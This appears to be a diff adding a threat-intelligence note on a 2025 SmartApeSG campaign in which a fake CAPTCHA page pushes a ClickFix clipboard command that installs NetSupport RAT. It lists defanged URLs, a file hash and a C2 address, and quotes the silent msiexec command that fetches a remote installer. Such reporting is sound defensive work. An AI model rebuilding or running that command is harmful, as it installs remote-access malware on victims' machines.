@@ -1,0 +1,40 @@
+2025-08-27 (WEDNESDAY): SMARTAPESG --> FAKE CAPTCHA PAGE --> CLICKFIX SCRIPT --> NETSUPPORTRAT
+
+NOTES:
+
+- The "SG" in SmartApeSG stands for SocGholish:
+  -- https://www.threatdown.com/blog/smartapesg-06-11-2024/
+
+INDICATORS:
+
+PAGE FROM COMPROMISED SITE WITH INJECTED SMARTAPESG SCRIPT:
+
+- hxxps[:]//spotlightonpoverty.org/
+
+URL FROM INJECTED SMARTAPESG SCRIPT:
+
+- hxxps[:]//cansupeker[.]com/d.js  <-- 302 redirect to next URL
+
+SMARTAPESG SCRIPT FOR FAKE CAPTCHA PAGE:
+
+- hxxps[:]//shark-watewer[.]com/ajax/pixi.min.js
+
+EXAMPLE OF CLICKFIX SCRIPT INJECTED INTO CLIPBOARD:
+
+msiexec /i hxxps[:]//stradomi[.]com/res/expectmatter /qn aa43a14b=ee36d492+acfb6c18*b4ac8e75)2f6b4cdc(bad2ec9e(8fa6222b+14672c69
+
+RUNNING THE ABOVE SCRIPT:
+
+- hxxps[:]//stradomi[.]com/res/expectmatter  <-- returned MSI file
+- hxxps[:]//stradomi[.]com/wear.pdb
+- hxxps[:]//stradomi[.]com/assets/img/fe99357658356062.txt
+
+EXAMPLE OF MSI FOR NETSUPPORT RAT RETRIEVED BY ABOVE CLICFIX SCRIPT:
+
+- SHA256 hash: b32a45a5f619bf615d44e5d620c18cf452154482f0453fa79461060ac502eede
+- File size: 2,547,712 bytes
+- File type: Microsoft Installer (.msi) file
+
+NETSUPPORT RAT C2 SERVER:
+
+- 194.37.97[.]139:443
